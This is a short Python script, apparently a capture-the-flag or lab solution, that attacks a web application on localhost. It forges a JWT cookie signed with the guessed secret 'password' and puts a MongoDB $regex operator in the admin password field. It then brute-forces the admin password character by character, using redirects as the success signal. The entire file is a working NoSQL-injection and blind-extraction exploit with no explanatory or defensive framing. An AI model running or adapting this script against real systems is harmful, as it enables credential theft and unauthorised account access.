import requests
import jwt

url='http://localhost:8000'
alnum="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
foundpass = False

def makereq(regex):
    data={
        "name" : "admin",
        "password" : {"$regex" : regex}
    }
    encoded = jwt.encode(data, "password", algorithm="HS256")

    a=encoded.decode('ascii')

    cookies=dict(auth=a)
    
    res=requests.get(url, cookies=cookies)
    print( regex ,res.status_code)
    return res

password="^"
while foundpass != True :
    for c in alnum:
        testpass = password + c
        response = makereq(testpass)
        if(len(response.history) != 0):
            print(f"PASSED {testpass}")
            password = password + c
            testpass=testpass+"$"
            response = makereq(testpass)
            if(len(response.history) != 0):
                foundpass=True
                print(f"Password is {testpass[1:-1]}")
            break
        else:
            print(f"FAILED {testpass}")